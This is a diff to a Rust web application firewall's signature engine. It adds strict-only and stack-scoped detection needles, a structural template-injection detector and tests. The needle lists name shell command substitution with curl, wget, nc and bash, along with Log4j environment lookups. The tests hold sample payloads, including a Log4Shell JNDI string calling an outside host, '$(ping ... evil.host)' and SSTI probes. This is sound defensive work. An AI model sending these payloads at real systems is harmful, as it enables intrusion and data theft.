@@ -15,6 +15,8 @@ use once_cell::sync::Lazy;
 use regex::Regex;
 use serde::{Deserialize, Serialize};
 
+use crate::{StackSet, WafLevel};
+
 // ---------------------------------------------------------------------------
 // Categories & patterns
 // ---------------------------------------------------------------------------
@@ -55,23 +57,37 @@ impl fmt::Display for AttackCategory {
     }
 }
 
-#[derive(Debug, Clone)]
+/// A single detection signature. All metadata is `&'static str` — the table
+/// lives in the binary's read-only data, so building an engine never copies
+/// pattern identity around, and per-request hits only carry a `u32` index.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub struct SignaturePattern {
-    pub id: String,
+    pub id: &'static str,
     pub category: AttackCategory,
     /// 1 (info) … 5 (critical).
     pub severity: u8,
-    pub description: String,
+    /// Backend stacks whose runtime actually interprets this payload family.
+    /// [`StackSet::GENERIC`] patterns are active for every deployment.
+    pub stack: StackSet,
+    /// Only loaded into the automaton when the engine runs at
+    /// [`WafLevel::Strict`] — needles whose false-positive cost is acceptable
+    /// only when operators explicitly asked for maximum coverage.
+    pub strict_only: bool,
+    pub description: &'static str,
     /// Literal needle registered in the Aho-Corasick automaton.
     pub needle: &'static str,
 }
 
-#[derive(Debug, Clone)]
+/// A signature match. Deliberately allocation-free: `pattern` is an index
+/// resolved against the engine's active table, so a hit is a handful of
+/// integers instead of two heap Strings.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub struct SignatureHit {
-    pub pattern_id: String,
+    /// Index into the engine's active pattern list; resolve metadata via
+    /// [`SignatureEngine::pattern`].
+    pub pattern: u32,
     pub category: AttackCategory,
     pub severity: u8,
-    pub description: String,
     /// Byte offset where the needle was found.
     pub offset: usize,
     /// Length of the matched needle in bytes.
@@ -79,22 +95,26 @@ pub struct SignatureHit {
 }
 
 /// Built-in needle table. Patterns are kept short and high-signal so the
-/// automaton stays compact and false positives remain rare.
+/// automaton stays compact and false positives remain rare. Every entry's
+/// identity is baked into the binary; building an engine only selects which
+/// slices of this table land in its automaton.
 fn builtin_patterns() -> Vec<SignaturePattern> {
-    let mut v: Vec<SignaturePattern> = Vec::with_capacity(120);
+    let mut v: Vec<SignaturePattern> = Vec::with_capacity(132);
     // Scoped so the closure's mutable borrow of `v` ends before it is moved
     // out below.
     {
-        let mut push = |id: &str,
+        let mut push = |id: &'static str,
                         cat: AttackCategory,
                         sev: u8,
-                        desc: &str,
+                        desc: &'static str,
                         needle: &'static str| {
             v.push(SignaturePattern {
-                id: id.to_string(),
+                id,
                 category: cat,
                 severity: sev,
-                description: desc.to_string(),
+                stack: StackSet::GENERIC,
+                strict_only: false,
+                description: desc,
                 needle,
             });
         };
@@ -866,12 +886,135 @@ fn builtin_patterns() -> Vec<SignaturePattern> {
         push("XSS-018", AttackCategory::Xss, 4, "eval() call", "eval(");
         push("XSS-019", AttackCategory::Xss, 3, "alert() call", "alert(");
     }
+
+    // Stack scoping: deserialization and EL-lookup markers only matter to the
+    // runtime that actually parses them. Engines built for a known stack set
+    // drop the rest from the automaton; unconfigured deployments (stack set
+    // `ALL`) keep everything.
+    let stack_for = |id: &str| match id {
+        "DZ-001" | "DZ-008" | "DZ-009" | "TI-006" => StackSet::JAVA,
+        "DZ-002" | "DZ-004" | "DZ-011" | "TI-007" => StackSet::PYTHON,
+        "DZ-005" | "DZ-006" | "DZ-007" | "DZ-010" => StackSet::PHP,
+        "DZ-003" => StackSet::NODE,
+        _ => StackSet::GENERIC,
+    };
+    for p in &mut v {
+        p.stack = stack_for(p.id);
+    }
+
+    // Strict-only additions. These fire in environments where operators
+    // explicitly chose coverage over noise: command-substitution starters
+    // beyond the always-on `$(whoami)`/`$(id)` pair, and Log4j lookup
+    // containers used by obfuscated Log4Shell variants.
+    let mut push_strict = |id: &'static str,
+                           cat: AttackCategory,
+                           sev: u8,
+                           stack: StackSet,
+                           desc: &'static str,
+                           needle: &'static str| {
+        v.push(SignaturePattern {
+            id,
+            category: cat,
+            severity: sev,
+            stack,
+            strict_only: true,
+            description: desc,
+            needle,
+        });
+    };
+    push_strict(
+        "CI-101",
+        AttackCategory::CommandInjection,
+        5,
+        StackSet::GENERIC,
+        "command substitution (cat)",
+        "$(cat",
+    );
+    push_strict(
+        "CI-102",
+        AttackCategory::CommandInjection,
+        5,
+        StackSet::GENERIC,
+        "command substitution (ping)",
+        "$(ping",
+    );
+    push_strict(
+        "CI-103",
+        AttackCategory::CommandInjection,
+        5,
+        StackSet::GENERIC,
+        "command substitution (curl)",
+        "$(curl",
+    );
+    push_strict(
+        "CI-104",
+        AttackCategory::CommandInjection,
+        5,
+        StackSet::GENERIC,
+        "command substitution (wget)",
+        "$(wget",
+    );
+    push_strict(
+        "CI-105",
+        AttackCategory::CommandInjection,
+        5,
+        StackSet::GENERIC,
+        "command substitution (netcat)",
+        "$(nc",
+    );
+    push_strict(
+        "CI-106",
+        AttackCategory::CommandInjection,
+        5,
+        StackSet::GENERIC,
+        "command substitution (bash)",
+        "$(bash",
+    );
+    push_strict(
+        "TI-101",
+        AttackCategory::TemplateInjection,
+        5,
+        StackSet::JAVA,
+        "Log4j case-normalization lookup",
+        "${lower:",
+    );
+    push_strict(
+        "TI-102",
+        AttackCategory::TemplateInjection,
+        5,
+        StackSet::JAVA,
+        "Log4j case-normalization lookup (upper)",
+        "${upper:",
+    );
+    push_strict(
+        "TI-103",
+        AttackCategory::TemplateInjection,
+        5,
+        StackSet::JAVA,
+        "Log4j environment lookup",
+        "${env:",
+    );
+    push_strict(
+        "TI-104",
+        AttackCategory::TemplateInjection,
+        5,
+        StackSet::JAVA,
+        "Log4j system-property lookup",
+        "${sys:",
+    );
+
     v
 }
 
 /// Aho-Corasick automaton over the built-in pattern table.
+///
+/// The engine holds only the patterns active for its profile (level × stack
+/// set) and owns them as `Copy` structs — building one never allocates
+/// pattern metadata, and a scan hit is a `u32` index resolved back through
+/// [`SignatureEngine::pattern`].
 pub struct SignatureEngine {
     aho: AhoCorasick,
+    /// Active patterns in automaton-pattern-index order.
     patterns: Vec<SignaturePattern>,
 }
 
@@ -890,12 +1033,32 @@ impl Default for SignatureEngine {
 }
 
 impl SignatureEngine {
-    /// Build the engine with the built-in pattern table. The automaton is
-    /// constructed once and reused for every request.
+    /// Build the engine with the full built-in pattern table at the Normal
+    /// level. The automaton is constructed once and reused for every request.
     pub fn new() -> Self {
-        let patterns = builtin_patterns();
+        Self::for_profile(WafLevel::Normal, StackSet::ALL)
+    }
+
+    /// Build an engine for a detection level plus backend-stack selection.
+    /// Needles belonging to disabled stacks or to the Strict-only set are
+    /// never registered in the automaton, so filtering them out saves work on
+    /// every request rather than filtering hits afterwards.
+    pub fn for_profile(level: WafLevel, stacks: StackSet) -> Self {
+        let patterns: Vec<SignaturePattern> = builtin_patterns()
+            .into_iter()
+            .filter(|p| {
+                (level.is_strict() || !p.strict_only)
+                    && stacks.contains(p.stack)
+            })
+            .collect();
         let needles: Vec<&str> = patterns.iter().map(|p| p.needle).collect();
         let aho = AhoCorasickBuilder::new()
+            // LeftmostLongest matters for needle sets with shared prefixes:
+            // under the default Standard semantics the short `${` (TI-003)
+            // wins the position and consumes it, so the critical `${jndi:`
+            // (TI-006) Log4Shell needle can never fire on a real payload.
+            // Longest-match keeps the high-signal needle authoritative.
+            .match_kind(aho_corasick::MatchKind::LeftmostLongest)
             .ascii_case_insensitive(true)
             .build(&needles)
             .expect("aho-corasick build cannot fail with valid UTF-8 needles");
@@ -906,15 +1069,31 @@ impl SignatureEngine {
         self.patterns.len()
     }
 
-    /// Scan `haystack` and return every signature that fired. Results are
-    /// de-duplicated by pattern id so a payload repeating the same needle
-    /// doesn't multiply the score.
-    pub fn scan(&self, haystack: &str) -> Vec<SignatureHit> {
+    /// Resolve an automaton pattern index to its static metadata.
+    pub fn pattern(&self, idx: u32) -> &SignaturePattern {
+        &self.patterns[idx as usize]
+    }
+
+    pub fn pattern_id(&self, idx: u32) -> &str {
+        self.pattern(idx).id
+    }
+
+    /// Scan `haystack` into caller-owned buffers, clearing them first. Hot
+    /// paths reuse one `hits`/`seen` pair across every value of a request, so
+    /// scanning a full request costs a single heap allocation instead of one
+    /// per field. Results are de-duplicated by pattern so a payload repeating
+    /// the same needle doesn't multiply the score.
+    pub fn scan_into(
+        &self,
+        haystack: &str,
+        hits: &mut Vec<SignatureHit>,
+        seen: &mut Vec<u32>,
+    ) {
+        hits.clear();
+        seen.clear();
         if haystack.is_empty() {
-            return Vec::new();
+            return;
         }
-        let mut hits: Vec<SignatureHit> = Vec::new();
-        let mut seen: Vec<u32> = Vec::new();
         for m in self.aho.find_iter(haystack) {
             let pid = m.pattern().as_u32();
             if seen.contains(&pid) {
@@ -923,14 +1102,19 @@ impl SignatureEngine {
             seen.push(pid);
             let p = &self.patterns[pid as usize];
             hits.push(SignatureHit {
-                pattern_id: p.id.clone(),
+                pattern: pid,
                 category: p.category,
                 severity: p.severity,
-                description: p.description.clone(),
                 offset: m.start(),
                 length: m.end() - m.start(),
             });
         }
+    }
+
+    /// Scan `haystack` and return every signature that fired.
+    pub fn scan(&self, haystack: &str) -> Vec<SignatureHit> {
+        let mut hits = Vec::new();
+        self.scan_into(haystack, &mut hits, &mut Vec::new());
         hits
     }
 
@@ -1502,6 +1686,92 @@ pub fn detect_xss(input: &str) -> (bool, String) {
 }
 
 // ---------------------------------------------------------------------------
+// Structural expression / template injection detection
+// ---------------------------------------------------------------------------
+
+/// Detect expression-language and template injection by *structure*, not by
+/// keyword: a `${…}` / `{{…}}` / `{%…%}` / `<%=…%>` container counts as an
+/// injection attempt only when its content shows interpreter-facing shape —
+/// a method call, arithmetic or comparison operators, a deep accessor chain,
+/// a `new` expression, or another nested container. A bare identifier like
+/// `${filename}` is templating, not an attack, and stays clean.
+///
+/// Returns the container kind that fired, for logging.
+pub fn detect_expr_injection(input: &str) -> Option<&'static str> {
+    // Cheap containment prefilter; the four scans are memchr-fast.
+    if !(input.contains("${")
+        || input.contains("{{")
+        || input.contains("{%")
+        || input.contains("<%="))
+    {
+        return None;
+    }
+    const CONTAINERS: &[(&str, &str, &str)] = &[
+        ("${", "}", "el"),
+        ("{{", "}}", "template"),
+        ("{%", "%}", "template-stmt"),
+        ("<%=", "%>", "jsp"),
+    ];
+    for (opener, closer, kind) in CONTAINERS {
+        let mut from = 0usize;
+        while let Some(rel) = input[from..].find(opener) {
+            let start = from + rel + opener.len();
+            let Some(end_rel) = input[start..].find(closer) else {
+                break;
+            };
+            let inner = &input[start..start + end_rel];
+            if !inner.is_empty()
+                && inner.len() <= 256
+                && is_structural_expr(inner)
+            {
+                return Some(kind);
+            }
+            from = start + end_rel;
+        }
+    }
+    None
+}
+
+/// Structural features that separate an evaluated expression from a literal
+/// placeholder. Deliberately conservative: `/` and `-` are excluded from the
+/// operator set (URL paths and hyphenated names are everywhere), and a
+/// two-segment accessor chain (`user.name`) is too common in honest
+/// templating to flag.
+fn is_structural_expr(inner: &str) -> bool {
+    // A nested container is evaluation by construction (${jndi:${sys:…}}).
+    if inner.contains("${") || inner.contains("{{") || inner.contains("{%") {
+        return true;
+    }
+    let bytes = inner.as_bytes();
+    // Method or function call: identifier immediately followed by `(`.
+    for w in bytes.windows(2) {
+        if w[1] == b'(' && (w[0].is_ascii_alphanumeric() || w[0] == b'_') {
+            return true;
+        }
+    }
+    // Arithmetic / comparison / assignment operators between the braces
+    // ({{7*7}}, ${a=b}, {% if x > 1 %}).
+    if bytes.iter().any(|&c| {
+        matches!(
+            c,
+            b'+' | b'*' | b'%' | b'|' | b'^' | b'<' | b'>' | b'=' | b'!'
+        )
+    }) {
+        return true;
+    }
+    // Deep accessor chain: three or more dotted segments
+    // (config.__class__.__init__.__globals__).
+    if inner.split('.').filter(|s| !s.is_empty()).count() >= 3 {
+        return true;
+    }
+    // Object construction: `new` as a standalone word.
+    if inner.split_whitespace().any(|w| w == "new") {
+        return true;
+    }
+    false
+}
+
+// ---------------------------------------------------------------------------
 // Tests
 // ---------------------------------------------------------------------------
 
@@ -1522,21 +1792,98 @@ mod tests {
     fn engine_finds_ssrf_metadata() {
         let e = SignatureEngine::new();
         let hits = e.scan("http://169.254.169.254/latest/meta-data/");
-        assert!(hits.iter().any(|h| h.pattern_id == "SSRF-001"));
+        assert!(hits.iter().any(|h| e.pattern_id(h.pattern) == "SSRF-001"));
     }
 
     #[test]
     fn engine_case_insensitive() {
         let e = SignatureEngine::new();
         let hits = e.scan("UNION SELECT password FROM users");
-        assert!(hits.iter().any(|h| h.pattern_id == "SQL-001"));
+        assert!(hits.iter().any(|h| e.pattern_id(h.pattern) == "SQL-001"));
     }
 
     #[test]
     fn engine_dedupes() {
         let e = SignatureEngine::new();
         let hits = e.scan("../ ../ ../");
-        assert_eq!(hits.iter().filter(|h| h.pattern_id == "PT-001").count(), 1);
+        assert_eq!(
+            hits.iter()
+                .filter(|h| e.pattern_id(h.pattern) == "PT-001")
+                .count(),
+            1
+        );
+    }
+
+    #[test]
+    fn strict_profile_loads_strict_only_needles() {
+        let normal =
+            SignatureEngine::for_profile(WafLevel::Normal, StackSet::ALL);
+        let strict =
+            SignatureEngine::for_profile(WafLevel::Strict, StackSet::ALL);
+        assert!(strict.pattern_count() > normal.pattern_count());
+        assert!(strict
+            .scan("$(ping -c 1 evil.host)")
+            .iter()
+            .any(|h| { strict.pattern_id(h.pattern) == "CI-102" }));
+        assert!(normal
+            .scan("$(ping -c 1 evil.host)")
+            .iter()
+            .all(|h| strict.pattern_id(h.pattern) != "CI-102"));
+    }
+
+    #[test]
+    fn stack_profile_drops_other_language_needles() {
+        let java = SignatureEngine::for_profile(
+            WafLevel::Normal,
+            StackSet::GENERIC.union(StackSet::JAVA),
+        );
+        assert!(java
+            .scan("aced0005 01 02")
+            .iter()
+            .any(|h| java.pattern_id(h.pattern) == "DZ-001"));
+        assert!(java
+            .scan("unserialize($_GET[x])")
+            .iter()
+            .all(|h| java.pattern_id(h.pattern) != "DZ-010"));
+        let php = SignatureEngine::for_profile(
+            WafLevel::Normal,
+            StackSet::GENERIC.union(StackSet::PHP),
+        );
+        assert!(php
+            .scan("test unserialize(:__wakeup)")
+            .iter()
+            .any(|h| php.pattern_id(h.pattern) == "DZ-005"));
+    }
+
+    #[test]
+    fn log4shell_query_payload_hits_critical_needle() {
+        // Regression guard for the benchmark miss: the payload lives in the
+        // query string and must reach the ${jndi: needle.
+        let e = SignatureEngine::for_profile(WafLevel::Normal, StackSet::ALL);
+        let hits =
+            e.scan("action=${jndi:ldap://${sys:java.version}.example.com}");
+        assert!(hits.iter().any(|h| e.pattern_id(h.pattern) == "TI-006"));
+        assert!(hits.iter().any(|h| h.severity >= 5));
+    }
+
+    #[test]
+    fn detect_expr_injection_structural_payloads() {
+        assert!(detect_expr_injection("{{7*7}}").is_some());
+        assert!(detect_expr_injection("${System.getProperty(\"user.dir\")}")
+            .is_some());
+        assert!(detect_expr_injection("${jndi:${sys:java.version}}").is_some());
+        assert!(
+            detect_expr_injection("{{config.__class__.__init__}}").is_some()
+        );
+        assert!(detect_expr_injection("${new java.lang.Runtime}").is_some());
+    }
+
+    #[test]
+    fn detect_expr_injection_ignores_innocent_templating() {
+        assert!(detect_expr_injection("${filename}").is_none());
+        assert!(detect_expr_injection("{{user.name}}").is_none());
+        assert!(detect_expr_injection("plain text").is_none());
+        assert!(detect_expr_injection("a/b/c${x}/d").is_none());
     }
 
     #[test]
